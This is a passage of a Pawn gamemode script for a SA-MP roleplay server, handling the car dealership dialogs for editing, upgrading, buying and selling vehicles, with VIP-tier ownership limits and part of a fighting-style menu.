                 SetPVarInt(playerid, "editingcd", -1);
			}
		}
		else
		{
             SavecDealerships();
             SetPVarInt(playerid, "editingcd", -1);
		}
	}
	else if(dialogid == DIALOG_CDUPGRADE)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1)
		{
            if(listitem == 0) // Vehicle Spawn
			{
				SendClientMessage(playerid, COLOR_GRAD2, " Please stand where you want to have your brought vehicles spawn.");
				SendClientMessage(playerid, COLOR_GRAD2, " Once ready press the fire button.");
				SetPVarInt(playerid, "editingcdvehpos", 2);
			}
            if(listitem == 1) // Radius
			{
				ShowPlayerDialogEx(playerid, DIALOG_CDRADIUS, DIALOG_STYLE_INPUT, "Car Dealership:", " Choose the new radius:", "Edit", "Back");
			}
			else if(listitem == 2) // Dealership Name
			{
				ShowPlayerDialogEx(playerid, DIALOG_CDNAME, DIALOG_STYLE_INPUT, "Car Dealership:", " Choose the new name:", "Edit", "Back");
			}
			else if(listitem == 3) // Price
			{
				ShowPlayerDialogEx(playerid, DIALOG_CDPRICE, DIALOG_STYLE_INPUT, "Car Dealership:", " Choose the new price:", "Edit", "Back");
			}
		}
		else
		{
            SavecDealerships();
            SetPVarInt(playerid, "editingcd", -1);
		}
	}
	else if(dialogid == DIALOG_CDRADIUS)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1)
		{
			new d;
			d = GetPVarInt(playerid, "editingcd");
			new Float:radius = floatstr(inputtext);
			new Float:radiusex = CarDealershipInfo[d][cdRadius];
			new test = floatround(radius), test1 = floatround(radiusex);
            if(CarDealershipInfo[d][cdRadius] > radius)
	        {
				 new cost = (test - test1) * (test1 * 1000);
				 if(PlayerInfo[playerid][pCash] < cost)
				 {
                     format(string, sizeof(string), "ERROR: You do not have enough money for this upgrade ($%d).",cost);
                     SendClientMessage(playerid, COLOR_GREY, string);
                     return 1;
				 }
				 format(string, sizeof(string), " Car Dealership radius upgraded from %.1f to %.1f for $%d.",radiusex, radius, cost);
                 SendClientMessage(playerid, COLOR_GREY, string);
	             CarDealershipInfo[d][cdRadius] = radius;
	             format(string,128,"Car Dealership %s\nOwner: %s\nID: %d", CarDealershipInfo[d][cdMessage], CarDealershipInfo[d][cdOwner], d);
	             UpdateDynamic3DTextLabelText(CarDealershipInfo[d][cdTextLabel], COLOR_LIGHTBLUE, string);
	             new listitems[] = "1 Vehicle Spawn\n2 Radius\n3 Dealership Name\n4 Price";
			     ShowPlayerDialogEx(playerid,DIALOG_CDUPGRADE,DIALOG_STYLE_LIST,"Choose an item to continue", listitems,"Select","Cancel");
			     SavecDealerships();
	        }
		}
		else
		{
		    new listitems[] = "1 Vehicle Spawn\n2 Radius\n3 Dealership Name\n4 Price";
			ShowPlayerDialogEx(playerid,DIALOG_CDUPGRADE,DIALOG_STYLE_LIST,"Choose an item to continue", listitems,"Select","Cancel");
		}
	}
	else if(dialogid == DIALOG_CDNAME)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1)
		{
			new d;
			d = GetPVarInt(playerid, "editingcd");
            if(!strlen(inputtext))
			{
			    SendClientMessage(playerid, COLOR_LIGHTRED, "** You must type a name **");
    	        ShowPlayerDialogEx(playerid, DIALOG_CDNAME, DIALOG_STYLE_INPUT, "Car Dealership:", " Choose the new name:", "Edit", "Back");
		        return 1;
			}
			new cost = strlen(inputtext) * 50;
			format(string, sizeof(string), " Car Dealership name upgraded from %s to %s for $%d.", CarDealershipInfo[d][cdMessage], inputtext, cost);
            SendClientMessage(playerid, COLOR_GREY, string);
	        strmid(CarDealershipInfo[d][cdMessage], inputtext, 0, strlen(inputtext), 255);
	        format(string,128,"Car Dealership %s\nOwner: %s\nID: %d", CarDealershipInfo[d][cdMessage], CarDealershipInfo[d][cdOwner], d);
	        UpdateDynamic3DTextLabelText(CarDealershipInfo[d][cdTextLabel], COLOR_LIGHTBLUE, string);
	        new listitems[] = "1 Vehicle Spawn\n2 Radius\n3 Dealership Name\n4 Price";
			ShowPlayerDialogEx(playerid,DIALOG_CDUPGRADE,DIALOG_STYLE_LIST,"Choose an item to continue", listitems,"Select","Cancel");
			SavecDealerships();
		}
		else
		{
		    new listitems[] = "1 Vehicle Spawn\n2 Radius\n3 Dealership Name\n4 Price";
			ShowPlayerDialogEx(playerid,DIALOG_CDUPGRADE,DIALOG_STYLE_LIST,"Choose an item to continue", listitems,"Select","Cancel");
		}
	}
	else if(dialogid == DIALOG_CDEDITCARS)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1)
		{
			new cdvid;
            if(IsNumeric(inputtext))
	        {
	             cdvid = strval(inputtext);
	             if(CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdVehicleModel][cdvid-1])
	             {
	                 SetPVarInt(playerid, "editingcdveh", cdvid-1);
	                 new listitems[] = "1 Edit Model\n2 Edit Cost\n3 Edit Park\n4 Delete Vehicle";
			         ShowPlayerDialogEx(playerid,DIALOG_CDEDITONE,DIALOG_STYLE_LIST,"Car Dealership:", listitems,"Select","Cancel");
				 }
	        }
		}
		else
		{
		    new listitems[] = "1 New Vehicle\n2 My Vehicles\n3 Upgrade\n4 Till";
			ShowPlayerDialogEx(playerid,DIALOG_CDEDIT,DIALOG_STYLE_LIST,"Choose an item to continue", listitems,"Select","Cancel");
		}
	}
	else if(dialogid == DIALOG_CDEDITONE)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1 && GetPVarInt(playerid, "editingcdveh") != -1)
		{
            if(listitem == 0) // Edit Model
			{
	             ShowPlayerDialogEx(playerid, DIALOG_CDEDITMODEL, DIALOG_STYLE_INPUT, "Car Dealership:", " Choose the new model id:", "Edit", "Back");
	        }
	        else if(listitem == 1) // Edit Cost
			{
	             ShowPlayerDialogEx(playerid, DIALOG_CDEDITCOST, DIALOG_STYLE_INPUT, "Car Dealership:", " Choose the new price of the car:", "Edit", "Back");
	        }
	        else if(listitem == 2) // Edit Park
			{
				 PutPlayerInVehicle(playerid, CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdVehicleId][GetPVarInt(playerid, "editingcdveh")], 0);
	             SendClientMessage(playerid, COLOR_GRAD2, " Please stand where you want to park the vehicle.");
				 SendClientMessage(playerid, COLOR_GRAD2, " Once ready press the fire button.");
				 SetPVarInt(playerid, "editingcdvehpos", 1);
	        }
	        else if(listitem == 3) // Delete Vehicle
			{
	             format(string, sizeof(string), "Are you sure you want to delete this %s?\nNote: You will not get any refounds.",
				 GetVehicleName(CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdVehicleId][GetPVarInt(playerid, "editingcdveh")]));
		         ShowPlayerDialogEx(playerid,DIALOG_CDDELVEH,DIALOG_STYLE_MSGBOX,"Warning:",string,"Ok","Cancel");
	        }
		}
		else
		{
            SavecDealerships();
            SetPVarInt(playerid, "editingcdveh", -1);
		}
	}
    else if(dialogid == DIALOG_CDEDITMODEL)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1 && GetPVarInt(playerid, "editingcdveh") != -1)
		{
			new modelid, d, v;
			new text_info[128];
			d = GetPVarInt(playerid, "editingcd");
			v = GetPVarInt(playerid, "editingcdveh");
            if(IsNumeric(inputtext))
	        {
	             modelid = strval(inputtext);
	             if(modelid < 400 || modelid > 611) { SendClientMessage(playerid, COLOR_GREY, "   Vehicle Number can't be below 400 or above 611!"); return 1; }
	             CarDealershipInfo[d][cdVehicleModel][v] = modelid;
	             DestroyDynamic3DTextLabel(CarDealershipInfo[d][cdVehicleLabel][v]);
	             DestroyVehicle(CarDealershipInfo[d][cdVehicleId][v]);
	             VehicleRadioStation[CarDealershipInfo[d][cdVehicleId][v]] = 0;
	             new carcreated;
	             carcreated = CreateVehicle(CarDealershipInfo[d][cdVehicleModel][v], CarDealershipInfo[d][cdVehicleSpawnX][v], CarDealershipInfo[d][cdVehicleSpawnY][v], CarDealershipInfo[d][cdVehicleSpawnZ][v], CarDealershipInfo[d][cdVehicleSpawnAngle][v], 0, 0, 6);
		         format(text_info, sizeof(text_info),"%s For Sale | Price: %d", GetVehicleName(carcreated), CarDealershipInfo[d][cdVehicleCost][v]);
                 CarDealershipInfo[d][cdVehicleLabel][v] = CreateDynamic3DTextLabel(text_info,COLOR_LIGHTBLUE,0.0, 0.0, 0.0,8.0,INVALID_PLAYER_ID,carcreated);
	             CarDealershipInfo[d][cdVehicleId][v] = carcreated;
	             new listitems[] = "1 Edit Model\n2 Edit Cost\n3 Edit Park\n4 Delete Vehicle";
			     ShowPlayerDialogEx(playerid,DIALOG_CDEDITONE,DIALOG_STYLE_LIST,"Car Dealership:", listitems,"Select","Cancel");
			     SavecDealerships();
	        }
		}
		else
		{
		    new listitems[] = "1 Edit Model\n2 Edit Cost\n3 Edit Park\n4 Delete Vehicle";
			ShowPlayerDialogEx(playerid,DIALOG_CDEDITONE,DIALOG_STYLE_LIST,"Car Dealership:", listitems,"Select","Cancel");
		}
	}
	else if(dialogid == DIALOG_CDEDITCOST)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1 && GetPVarInt(playerid, "editingcdveh") != -1)
		{
			new price, d, v;
			new text_info[128];
			d = GetPVarInt(playerid, "editingcd");
			v = GetPVarInt(playerid, "editingcdveh");
            if(IsNumeric(inputtext))
	        {
	             price = strval(inputtext);
	             CarDealershipInfo[d][cdVehicleCost][v] = price;
	             format(text_info, sizeof(text_info), "%s For Sale | Price: %d", GetVehicleName(CarDealershipInfo[d][cdVehicleId][v]), CarDealershipInfo[d][cdVehicleCost][v]);
	             UpdateDynamic3DTextLabelText(CarDealershipInfo[d][cdVehicleLabel][v], COLOR_LIGHTBLUE, text_info);
	             new listitems[] = "1 Edit Model\n2 Edit Cost\n3 Edit Park\n4 Delete Vehicle";
			     ShowPlayerDialogEx(playerid,DIALOG_CDEDITONE,DIALOG_STYLE_LIST,"Car Dealership:", listitems,"Select","Cancel");
			     SavecDealerships();
	        }
		}
		else
		{
		    new listitems[] = "1 Edit Model\n2 Edit Cost\n3 Edit Park\n4 Delete Vehicle";
			ShowPlayerDialogEx(playerid,DIALOG_CDEDITONE,DIALOG_STYLE_LIST,"Car Dealership:", listitems,"Select","Cancel");
		}
	}
	else if(dialogid == DIALOG_CDDELVEH)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1 && GetPVarInt(playerid, "editingcdveh") != -1)
		{
			DestroyCarDealershipVehicle(GetPVarInt(playerid, "editingcd"), GetPVarInt(playerid, "editingcdveh"));
			SavecDealerships();
		}
		else
		{
		    new listitems[] = "1 Edit Model\n2 Edit Cost\n3 Edit Park\n4 Delete Vehicle";
			ShowPlayerDialogEx(playerid,DIALOG_CDEDITONE,DIALOG_STYLE_LIST,"Car Dealership:", listitems,"Select","Cancel");
		}
	}
	else if(dialogid == DIALOG_CDEDITPARK)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1 && GetPVarInt(playerid, "editingcdveh") != -1 &&  GetPVarInt(playerid, "editingcdvehpos") == 1 || GetPVarInt(playerid, "editingcdvehnew"))
		{
			new Float: x, Float: y, Float: z, Float: a;
			new d, v, text_info[128];
			d = GetPVarInt(playerid, "editingcd");
			v = GetPVarInt(playerid, "editingcdveh");
			GetVehiclePos(CarDealershipInfo[d][cdVehicleId][v], x, y, z);
	        GetVehicleZAngle(CarDealershipInfo[d][cdVehicleId][v], a);
			if(IsPlayerInRangeOfPoint(playerid, CarDealershipInfo[d][cdRadius], CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ]))
		    {
			     CarDealershipInfo[d][cdVehicleSpawnX][v] = x;
                 CarDealershipInfo[d][cdVehicleSpawnY][v] = y;
                 CarDealershipInfo[d][cdVehicleSpawnZ][v] = z;
                 CarDealershipInfo[d][cdVehicleSpawnAngle][v] = a;
                 SetPVarInt(playerid, "editingcdvehpos", 0);
                 SetPVarInt(playerid, "editingcdvehnew", 0);
                 DestroyDynamic3DTextLabel(CarDealershipInfo[d][cdVehicleLabel][v]);
	             DestroyVehicle(CarDealershipInfo[d][cdVehicleId][v]);
	             VehicleRadioStation[CarDealershipInfo[d][cdVehicleId][v]] = 0;
	             new carcreated;
	             carcreated = CreateVehicle(CarDealershipInfo[d][cdVehicleModel][v], CarDealershipInfo[d][cdVehicleSpawnX][v], CarDealershipInfo[d][cdVehicleSpawnY][v], CarDealershipInfo[d][cdVehicleSpawnZ][v], CarDealershipInfo[d][cdVehicleSpawnAngle][v], 0, 0, 6);
		         format(text_info, sizeof(text_info), "%s For Sale | Price: %d", GetVehicleName(carcreated), CarDealershipInfo[d][cdVehicleCost][v]);
                 CarDealershipInfo[d][cdVehicleLabel][v] = CreateDynamic3DTextLabel(text_info,COLOR_LIGHTBLUE,0.0, 0.0, 0.0,8.0,INVALID_PLAYER_ID,carcreated);
	             CarDealershipInfo[d][cdVehicleId][v] = carcreated;
	             TogglePlayerControllable(playerid, true);
	             new listitems[] = "1 Edit Model\n2 Edit Cost\n3 Edit Park\n4 Delete Vehicle";
			     ShowPlayerDialogEx(playerid,DIALOG_CDEDITONE,DIALOG_STYLE_LIST,"Car Dealership:", listitems,"Select","Cancel");
			     SavecDealerships();
			}
			else
			{
                 SendClientMessage(playerid, COLOR_GREY, "ERROR: you're out of this Car Dealership radius, please try again.");
                 TogglePlayerControllable(playerid, true);
			}
		}
		else if(response && GetPVarInt(playerid, "editingcd") != -1 && GetPVarInt(playerid, "editingcdvehpos") == 2)
		{
			new Float: x, Float: y, Float: z, Float: a;
			new d;
			GetPlayerPos(playerid,x,y,z);
	        GetPlayerFacingAngle(playerid, a);
			d = GetPVarInt(playerid, "editingcd");
			if(IsPlayerInRangeOfPoint(playerid, CarDealershipInfo[d][cdRadius], CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ]))
		    {
			     CarDealershipInfo[d][cdVehicleSpawn][0] = x;
                 CarDealershipInfo[d][cdVehicleSpawn][1] = y;
                 CarDealershipInfo[d][cdVehicleSpawn][2] = z;
                 CarDealershipInfo[d][cdVehicleSpawn][3] = a;
                 SetPVarInt(playerid, "editingcdvehpos", 0);
	             TogglePlayerControllable(playerid, true);
	             new listitems[] = "1 Vehicle Spawn\n2 Radius\n3 Dealership Name\n4 Price";
			     ShowPlayerDialogEx(playerid,DIALOG_CDUPGRADE,DIALOG_STYLE_LIST,"Choose an item to continue", listitems,"Select","Cancel");
			     SavecDealerships();
			}
			else
			{
                 SendClientMessage(playerid, COLOR_GREY, "ERROR: you're out of this Car Dealership radius, please try again.");
                 TogglePlayerControllable(playerid, true);
			}
		}
		else if(!response && GetPVarInt(playerid, "editingcd") != -1 && GetPVarInt(playerid, "editingcdvehpos") == 1)
		{
            new listitems[] = "1 Edit Model\n2 Edit Cost\n3 Edit Park\n4 Delete Vehicle";
			ShowPlayerDialogEx(playerid,DIALOG_CDEDITONE,DIALOG_STYLE_LIST,"Car Dealership:", listitems,"Select","Cancel");
			TogglePlayerControllable(playerid, true);
			SetPVarInt(playerid, "editingcdvehpos", 0);
		}
		else if(!response && GetPVarInt(playerid, "editingcd") != -1 && GetPVarInt(playerid, "editingcdvehpos") == 2)
		{
            new listitems[] = "1 Vehicle Spawn\n2 Radius\n3 Dealership Name\n4 Price";
		    ShowPlayerDialogEx(playerid,DIALOG_CDUPGRADE,DIALOG_STYLE_LIST,"Choose an item to continue", listitems,"Select","Cancel");
			TogglePlayerControllable(playerid, true);
			SetPVarInt(playerid, "editingcdvehpos", 0);
		}
	}
	else if(dialogid == DIALOG_CDNEWVEH)
	{ // car dealership dialog
		if(response && GetPVarInt(playerid, "editingcd") != -1)
		{
			new modelid, d;
			new Float: x, Float: y, Float: z, Float: a;
			new text_info[128];
			d = GetPVarInt(playerid, "editingcd");
			GetPlayerPos(playerid,x,y,z);
	        GetPlayerFacingAngle(playerid, a);
	        if(!IsNumeric(inputtext)) return SendClientMessage(playerid, COLOR_GRAD1, "ERROR: Model ID must be numbers.");
            if(IsPlayerInRangeOfPoint(playerid, CarDealershipInfo[d][cdRadius], CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ]))
	        {
	             modelid = strval(inputtext);
	             if(modelid < 400 || modelid > 611) { SendClientMessage(playerid, COLOR_GREY, "   Vehicle Number can't be below 400 or above 611!"); return 1; }
	             new cdvehicleid = CreateCarDealershipVehicle(d, modelid, x, y, z, a, 1337);
	             if(cdvehicleid == -1)
		         {
		             SendClientMessage(playerid, COLOR_GREY, "ERROR: Car couldn't be created.");
		         }
	             else
	             {
					 PutPlayerInVehicle(playerid, CarDealershipInfo[d][cdVehicleId][cdvehicleid], 0);
                     format(text_info, sizeof(text_info), " Car Dealership Vehicle created with Vehicle ID %d.", cdvehicleid-1);
		             SendClientMessage(playerid, COLOR_GRAD1, text_info);
		             SendClientMessage(playerid, COLOR_GRAD2, " Please stand where you want to add your new vehicle.");
				     SendClientMessage(playerid, COLOR_GRAD2, " Once ready press the fire button.");
				     SetPVarInt(playerid, "editingcdvehnew", 1);
		             SetPVarInt(playerid, "editingcdveh", cdvehicleid);
	             }
	        }
	        else
	        {
                 SendClientMessage(playerid, COLOR_GREY, "ERROR: you're out of this Car Dealership radius, please try again.");
                 TogglePlayerControllable(playerid, true);
	        }
		}
		else
		{
            TogglePlayerControllable(playerid, true);
			SetPVarInt(playerid, "editingcd", -1);
		}
	}
	else if(dialogid == DIALOG_CDBUY)
	{

	    // Account Eating Bug Fix
	    if(!IsPlayerInAnyVehicle(playerid))
		{
		    TogglePlayerControllable(playerid, 1);
			SendClientMessage(playerid,COLOR_GRAD2,"You need to be in the vehicle you wish to purchase.");
			return 1;
		}

		new vehicleid = GetPlayerVehicleID(playerid);
		new v = GetCarDealershipVehicleId(vehicleid);
		new d = GetCarDealershipId(vehicleid);
		if(response)
		{
            if(CarDealershipInfo[d][cdVehicleSpawn][0] == 0.0 && CarDealershipInfo[d][cdVehicleSpawn][1] == 0.0 && CarDealershipInfo[d][cdVehicleSpawn][2] == 0.0)
            {
				SendClientMessage(playerid, COLOR_GRAD1, "ERROR: The owner of this Car Dealership hasn't set the purchased vehicles spawn point.");
				RemovePlayerFromVehicle(playerid);
				new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
				TogglePlayerControllable(playerid, 1);
				return 1;
            }
            if(CarDealershipInfo[d][cdDonator] == 1 && PlayerInfo[playerid][pVip] < 1)
            {
 				SendClientMessage(playerid, COLOR_GREY, "The vehicles in this dealership are only available for Bronze VIP.");
				RemovePlayerFromVehicle(playerid);
				new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
				TogglePlayerControllable(playerid, 1);
				return 1;
            }
            if(CarDealershipInfo[d][cdDonator] == 2 && PlayerInfo[playerid][pVip] < 2)
            {
 				SendClientMessage(playerid, COLOR_GREY, "The vehicles in this dealership are only available for Silver VIP.");
				RemovePlayerFromVehicle(playerid);
				new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
				TogglePlayerControllable(playerid, 1);
				return 1;
            }
            if(CarDealershipInfo[d][cdDonator] == 3 && PlayerInfo[playerid][pVip] < 3)
            {
 				SendClientMessage(playerid, COLOR_GREY, "The vehicles in this dealership are only available for Gold VIP.");
				RemovePlayerFromVehicle(playerid);
				new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
				TogglePlayerControllable(playerid, 1);
				return 1;
            }

            new playervehicleid = GetPlayerFreeVehicleId(playerid),
				totalvehicles = GetPlayerVehicleCountEx(playerid);
            // (TEMPORARY - ZHAO NOTE) TempVIP not added yet
			if(PlayerInfo[playerid][pVip] == 0 && totalvehicles >= 5) //PlayerInfo[playerid][pTempVIP] > 0) && carsamount >= 5)
			{
                SendClientMessage(playerid, COLOR_GREY, "ERROR: You can't have more cars, non-VIP can only own 5 cars.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
                return 1;
			}
            if(PlayerInfo[playerid][pVip] == 1 && totalvehicles >= 7)
            {
                SendClientMessage(playerid, COLOR_GREY, "ERROR: You can't have more cars, Bronze VIP can only own 7 cars.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
                return 1;
            }
            if(PlayerInfo[playerid][pVip] == 2 && totalvehicles >= 8)
            {
                SendClientMessage(playerid, COLOR_GREY, "ERROR: You can't have more cars, Silver VIP can only own 8 cars.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
                return 1;
            }
            if(PlayerInfo[playerid][pVip] == 3 && totalvehicles >= 10)
            {
                SendClientMessage(playerid, COLOR_GREY, "ERROR: You can't have more cars, Gold VIP can only own 10 cars.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
                return 1;
            }
		    if(playervehicleid == -1)
		    {
		        SendClientMessage(playerid, COLOR_GREY, "ERROR: You can't have more cars.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
                return 1;
		    }
           	if(PlayerInfo[playerid][pVip] == 0 && VehicleSpawned[playerid] > 0)
           	{
            	SendClientMessage(playerid, COLOR_GREY, "ERROR: You can only have 1 vehicle spawned at a time as non-VIP. Store that vehicle in order to purchase one.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
				return 1;
           	}
         	if(PlayerInfo[playerid][pVip] == 1 && VehicleSpawned[playerid] > 1)
         	{
         		SendClientMessage(playerid, COLOR_GREY, "ERROR: You can only have 2 vehicles spawned at a time as Bronze VIP. Store that vehicle in order to purchase one.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
				return 1;
           	}
         	if(PlayerInfo[playerid][pVip] == 2 && VehicleSpawned[playerid] > 2)
         	{
        		SendClientMessage(playerid, COLOR_GREY, "ERROR: You can only have 3 vehicles spawned at a time as Silver VIP. Store one vehicle in order to purchase one.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
				return 1;
           	}
          	if(PlayerInfo[playerid][pVip] == 3 && VehicleSpawned[playerid] > 3)
          	{
  				SendClientMessage(playerid, COLOR_GREY, "ERROR: You can only have 4 vehicles spawned at a time as Gold VIP. Store one vehicle in order to purchase one.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
				return 1;
           	}
           	/*if(PlayerInfo[playerid][pVip] == 4 && VehicleSpawned[playerid] >= 5)
           	{
				SendClientMessage(playerid, COLOR_GREY, "ERROR: You can only have 5 vehicles spawned at a time as Undefined VIP. Store one vehicle in order to purchase one.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
				return 1;
           	}
           	if(PlayerInfo[playerid][pVip] == 5 && VehicleSpawned[playerid] >= 5)
           	{
				SendClientMessage(playerid, COLOR_GREY, "ERROR: You can only have 5 vehicles spawned at a time as VIP Moderator. Store one vehicle in order to purchase one.");
                RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
				return 1;
           	}*/
           	if(PlayerInfo[playerid][pVip] < 0 || PlayerInfo[playerid][pVip] > 3)
           	{
           	    SendClientMessage(playerid, COLOR_GREY, "ERROR: Invalid VIP level.");
            	RemovePlayerFromVehicle(playerid);
                new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz+1.2);
                TogglePlayerControllable(playerid, 1);
				return 1;
           	}
		    new randcolor1 = Random(0, 126);
		    new randcolor2 = Random(0, 126);
		    SetPlayerPos(playerid, CarDealershipInfo[d][cdVehicleSpawn][0], CarDealershipInfo[d][cdVehicleSpawn][1], CarDealershipInfo[d][cdVehicleSpawn][2]+2);
		    TogglePlayerControllable(playerid, 1);
		    new cost;
		    if(PlayerInfo[playerid][pVip] < 1)
            {
                cost = CarDealershipInfo[d][cdVehicleCost][v];
	            if(PlayerInfo[playerid][pCash] < CarDealershipInfo[d][cdVehicleCost][v])
	            {
					SendClientMessage(playerid, COLOR_GRAD1, "ERROR: You don't have enough money to buy this.");
					RemovePlayerFromVehicle(playerid);
					new Float:slx, Float:sly, Float:slz;
					GetPlayerPos(playerid, slx, sly, slz);
					SetPlayerPos(playerid, slx, sly, slz+1.2);
					return 1;
	            }
                format(string, sizeof(string), " Thank you for buying at %s.", CarDealershipInfo[d][cdMessage]);
		        SendClientMessage(playerid, COLOR_GRAD1, string);
				PlayerInfo[playerid][pCash] -= CarDealershipInfo[d][cdVehicleCost][v];
		        CarDealershipInfo[d][cdTill] += (CarDealershipInfo[d][cdVehicleCost][v] * 40) / (100);
	        }
	        else
	        {
				if(CarDealershipInfo[d][cdDonator] > 0) cost = CarDealershipInfo[d][cdVehicleCost][v];
				else cost = (CarDealershipInfo[d][cdVehicleCost][v] * 80) / (100);
	            if(PlayerInfo[playerid][pCash] < cost)
	            {
					SendClientMessage(playerid, COLOR_GRAD1, "ERROR: You don't have enough money to buy this.");
					RemovePlayerFromVehicle(playerid);
					new Float:slx, Float:sly, Float:slz;
					GetPlayerPos(playerid, slx, sly, slz);
					SetPlayerPos(playerid, slx, sly, slz+1.2);
					return 1;
	            }
       		   	if(AdminDuty[playerid] == 1)
 				{
  					SendClientMessage(playerid, COLOR_GRAD1, "ERROR: You can't buy a vehicle while on-duty as admin.");
					RemovePlayerFromVehicle(playerid);
					new Float:slx, Float:sly, Float:slz;
					GetPlayerPos(playerid, slx, sly, slz);
					SetPlayerPos(playerid, slx, sly, slz+1.2);
					return 1;
				}

                format(string, sizeof(string), " Thank you for buying at %s.", CarDealershipInfo[d][cdMessage]);
		        SendClientMessage(playerid, COLOR_GRAD1, string);
		        PlayerInfo[playerid][pCash] -= cost;
				CarDealershipInfo[d][cdTill] += cost;
     		}

            new car = CreatePlayerVehicle(playerid, playervehicleid, CarDealershipInfo[d][cdVehicleModel][v], CarDealershipInfo[d][cdVehicleSpawn][0], CarDealershipInfo[d][cdVehicleSpawn][1], CarDealershipInfo[d][cdVehicleSpawn][2], CarDealershipInfo[d][cdVehicleSpawn][3], randcolor1, randcolor2, cost);
            SetTimerEx("PutPlayerInVeh", 2000, 0, "dd", playerid, car);
            SavecDealerships();
		}
		else
		{
            RemovePlayerFromVehicle(playerid);
            new Float:slx, Float:sly, Float:slz;
			GetPlayerPos(playerid, slx, sly, slz);
			SetPlayerPos(playerid, slx, sly, slz+1.2);
            TogglePlayerControllable(playerid, 1);
			return 1;
		}
	}
	else if(dialogid == DIALOG_CDSELL)
	{
		if(response)
		{
			if(GetPVarInt(playerid, "editingcd") == -1) return 1;
			PlayerInfo[playerid][pCash] += (CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdPrice] / 2);
			SellCarDealership(GetPVarInt(playerid, "editingcd"));
			PlayerPlayMusic(playerid);
			format(string, sizeof(string), "Car Dealership successfully sold for %d.", CarDealershipInfo[GetPVarInt(playerid, "editingcd")][cdPrice] / 2);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else
		{
            SetPVarInt(playerid, "editingcd", -1);
			return 1;
		}
	}
	if(dialogid == FIGHTMENU)
	{
		if(response)
		{
			if(GetPlayerCash(playerid) >= 5000)
			{
				if(listitem == 0)
				{
			    	PlayerInfo[playerid][pFightStyle] = FIGHT_STYLE_BOXING;
					SetPlayerFightingStyle (playerid, FIGHT_STYLE_BOXING);
					SendClientMessage(playerid, COLOR_WHITE, "You're now using the boxing fighting style!");
					GivePlayerCash(playerid, -5000);
				}
				if(listitem == 1)
				{
					PlayerInfo[playerid][pFightStyle] = FIGHT_STYLE_ELBOW;
					SetPlayerFightingStyle (playerid, FIGHT_STYLE_ELBOW);
					SendClientMessage(playerid, COLOR_WHITE, "You're now using the elbow fighting style!");
					GivePlayerCash(playerid, -5000);
				}
